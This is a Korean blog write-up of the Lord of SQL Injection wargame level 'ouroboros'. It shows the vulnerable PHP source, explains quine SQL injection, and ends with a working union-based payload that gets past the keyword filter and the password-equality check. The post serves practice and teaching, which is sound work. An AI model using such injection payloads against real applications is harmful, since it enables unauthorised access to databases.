---
title : "LOS Lv.30 ouroboros (풀이 봄)"
categories : [Wargame, rubiya]
tags : [quine sql injection, 풀이 봄]
---


## ouroboros
<hr style="border-top: 1px solid;"><br>

```php
query : select pw from prob_ouroboros where pw=''

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|rollup|join|@/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_ouroboros where pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("ouroboros");
  highlight_file(__FILE__);
?>
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

```?pw=' or 1 %23``` 해주면 아무것도 안나옴. -> 아무 값도 없다

따라서 union을 통해 값을 넣어줘야 되는데 불가능함. 

왜 와이 ? 문제 클리어 조건은 결과 pw와 입력 pw가 같아야 하는데 테이블에는 아무 값도 없는 상태이므로 union으로 값을 넣어줘도 클리어는 불가능.

그래서 혼란스러워하다가 답지를 보니 **quine**이라는 것이 있다고 함.

<br><br>

### quine
<hr style="border-top: 1px solid;"><br>

자기자신(즉 소스코드)를 출력하는 개념으로, 이 개념을 이용해서 sql언어로 작성된 quine이 있음. 
: <a href="https://ko.wikipedia.org/wiki/콰인_(전산학)" target="_blank">namuwiki - quine</a>   

<br><br>

### quine sql injection
<hr style="border-top: 1px solid;"><br>

```
34 = " (double quotes)

36 = $ (dollar)

39 = ' (single quote)
```

<br>

```php
SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine;
```

<br>

```php
SELECT 
  REPLACE (

    REPLACE (

      'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',

      CHAR(34),

      CHAR(39)

    ), # -> 'SELECT REPLACE(REPLACE('$',CHAR(34),CHAR(39)),CHAR(36),'$') AS Quine'

    CHAR(36),

    'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine'

  ) AS Quine; 
```

<br>

```php
# 싱글쿼트가 필요한 경우
select replace(replace('[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]',char(34),char(39)),char(36),'[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]') [postfix];
```

<br>

```php
# 더블쿼트가 필요한 경우
select replace(replace("[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]",char(39),char(34)),char(36),"[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]") [postfix];
```

<br>

자세한 건 <a href="https://blog.p6.is/quine-sql-injection/" target="_blank">blog.p6.is/quine-sql-injection/</a>  

정리하면 다음과 같음.

<br>

```php
$a = [추가해도 됨] select replace(replace("$", char(34), char(39)), char(36), "$") as quine [추가해도 됨]

# -> 단, 더블쿼터가 싱글쿼터로 바뀐다는 점 유의해서 추가

[추가해도 됨] select replace(replace('$a', char(34), char(39)), char(36), '$a') as quine [추가해도 됨]
```

<br><br>

### Payload
<hr style="border-top: 1px solid;"><br>

```' union```과 주석(%23)을 추가해주면 됨.

```php
?pw=' union select replace(replace('" union select replace(replace("$", char(34), char(39)), char(36), "$") as quine %23', char(34), char(39)), char(36), '" union select replace(replace("$", char(34), char(39)), char(36), "$") as quine %23') as quine %23
```

<br><br>
<hr style="border: 2px solid;">
<br><br>
